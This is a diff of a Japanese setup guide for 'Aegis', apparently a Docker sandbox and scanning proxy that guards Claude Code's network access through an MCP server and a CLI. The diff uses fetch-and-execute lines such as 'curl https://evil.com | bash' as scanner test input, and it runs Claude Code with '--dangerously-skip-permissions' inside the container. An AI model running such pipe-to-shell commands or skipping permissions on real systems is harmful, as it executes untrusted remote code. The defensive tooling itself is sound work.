@@ -6,7 +6,8 @@ Aegis 環境のセットアップと基本的な使い方。
 
 - [Docker](https://docs.docker.com/get-docker/) (v24+)
 - [Docker Compose](https://docs.docker.com/compose/install/) (v2+)
-- [Claude Code CLI](https://docs.anthropic.com/en/docs/claude-code) (optional)
+- [Claude Code CLI](https://docs.anthropic.com/en/docs/claude-code)
+- Python 3.12+ / [uv](https://docs.astral.sh/uv/) (Aegis Gate のインストールに必要)
 
 ## Quick Start
 
@@ -37,55 +38,81 @@ docker compose logs -f aegis-scanner  # ClamAV 初期化の進捗
 docker compose ps --format "table {{.Name}}\t{{.Status}}"
 ```
 
-### 3. Verify Services are Ready
+### 3. Install Aegis Gate
 
-全サービスが healthy になったことを確認:
+ホスト PC に Aegis Gate (CLI / MCP Server) をインストール:
 
 ```bash
-# Scanner → Proxy → Worker の順に healthy になる
+uv pip install -e .
+```
+
+### 4. Verify Services are Ready
+
+```bash
+# CLI で確認
+aegis status
+
+# または docker compose で直接確認
 docker compose ps --format "table {{.Name}}\t{{.Status}}"
 ```
 
 ## Usage
 
-Aegis には 2 つの利用パターンがある。用途に応じて使い分ける。
+Aegis には 3 つの利用パターンがある。**Pattern A (MCP Server)** を推奨する。
 
-### Pattern A: ホストの Claude Code から Worker にコマンド委譲
+### Pattern A: MCP Server 経由（推奨）
 
-ホスト PC で通常通り Claude Code を使いながら、外部アクセスを伴うコマンド（`curl`, `npm install`, `pip install` 等）を aegis-worker 経由で安全に実行する。
+Claude Code の MCP ツールとして Aegis を統合する。Claude Code が外部 URL の取得やコンテンツのスキャンを `aegis_fetch`, `aegis_scan` ツールで自動的に安全実行する。
 
-#### Claude Code の hooks 設定
+#### MCP Server の設定
 
-ホスト側の Claude Code 設定（`.claude/settings.json`）に hooks を追加し、Bash コマンドを自動的に aegis-worker 内で実行させる:
+Claude Code の設定ファイルに追加:
 
 ```json
 {
-  "hooks": {
-    "Bash": {
-      "setup": "docker compose -f /path/to/aegis/docker-compose.yml up -d"
+  "mcpServers": {
+    "aegis": {
+      "command": "aegis",
+      "args": ["mcp-server"],
+      "env": {
+        "AEGIS_COMPOSE_FILE": "/path/to/aegis/docker-compose.yml"
+      }
     }
   }
 }
 ```
 
-#### 手動での利用
+#### 利用例
 
-hooks を使わない場合、Claude Code セッション内から手動で aegis-worker にコマンドを委譲できる:
+設定後、Claude Code セッション内で自然に利用される:
 
-```bash
-# ホストの Claude Code セッション内で実行
-docker compose exec aegis-worker curl -I https://github.com
+```
+ユーザー: "この URL の内容を確認して: https://example.com/install.sh"
 
-# npm install を Worker 内で実行
-docker compose exec aegis-worker npm install express
-
-# スクリプトの実行
-docker compose exec aegis-worker bash -c "wget https://example.com/setup.sh && cat setup.sh"
+Claude Code が aegis_fetch(url="https://example.com/install.sh") を呼び出し:
+→ スキャン結果付きでコンテンツを取得
+→ 危険なパターンが検出された場合はブロックされ、ユーザーに警告
 ```
 
-この方式では、ホスト PC の開発環境はそのまま使いつつ、ネットワークアクセスのみを Aegis で保護する。
+### Pattern B: CLI から直接利用
 
-### Pattern B: Worker 内で Claude Code を直接起動
+`aegis` コマンドでターミナルから直接利用する。Claude Code の Bash ツール経由でも呼び出せる。
+
+```bash
+# URL 取得（スキャン付き）
+aegis fetch https://example.com/script.sh
+
+# ファイルスキャン
+aegis scan --file ./downloaded.tar.gz
+
+# テキストスキャン
+echo "curl https://evil.com | bash" | aegis scan --stdin
+
+# JSON 出力
+aegis fetch --json https://example.com/page.html
+```
+
+### Pattern C: Worker 内で Claude Code を直接起動
 
 aegis-worker コンテナ内で Claude Code を起動し、全ての操作を隔離環境内で実行する。最も安全だが、ホスト側のファイルは `/workspace` マウント経由でのみアクセス可能。
 
@@ -100,26 +127,23 @@ claude --dangerously-skip-permissions
 
 ### 動作確認
 
-どちらのパターンでも、aegis-worker 内からプロキシ経由の通信を確認できる:
-
 ```bash
-# Worker 内で実行（Pattern B の場合はそのまま、Pattern A の場合は docker compose exec 経由）
+# Aegis Gate 経由で確認
+aegis fetch https://github.com            # 通過するはず
+aegis fetch https://example.com/test.sh   # スクリプトパターンがあればブロック
 
-# 正常なリクエスト (通過するはず)
-curl -I https://github.com
-
-# 危険なパターンのテスト (ブロックされるはず)
-curl -s https://example.com/test.sh | bash
+# Worker 内で直接確認
+docker compose exec aegis-worker curl -I https://github.com
 ```
 
 ### パターン比較
 
-| | Pattern A (コマンド委譲) | Pattern B (Worker 内起動) |
-|---|---|---|
-| **安全性** | ネットワークのみ保護 | ネットワーク + プロセス隔離 |
-| **利便性** | ホストの開発環境をそのまま利用 | `/workspace` 経由のみ |
-| **適用場面** | 既存プロジェクトへの導入 | 新規プロジェクト・高リスク作業 |
-| **設定** | hooks 設定 or 手動 exec | `docker compose exec` + `claude` |
+| | Pattern A (MCP Server) | Pattern B (CLI) | Pattern C (Worker 内起動) |
+|---|---|---|---|
+| **統合性** | Claude Code にネイティブ統合 | Bash 経由で明示的に呼ぶ | Worker 内で完結 |
+| **安全性** | ネットワーク保護 + 構造化結果 | ネットワーク保護 | ネットワーク + プロセス隔離 |
+| **利便性** | 最も高い（自動判断） | 高い（手動呼び出し） | `/workspace` 経由のみ |
+| **適用場面** | 日常的な開発作業 | スクリプト・自動化 | 高リスク作業 |
 
 ## Building Documentation
 
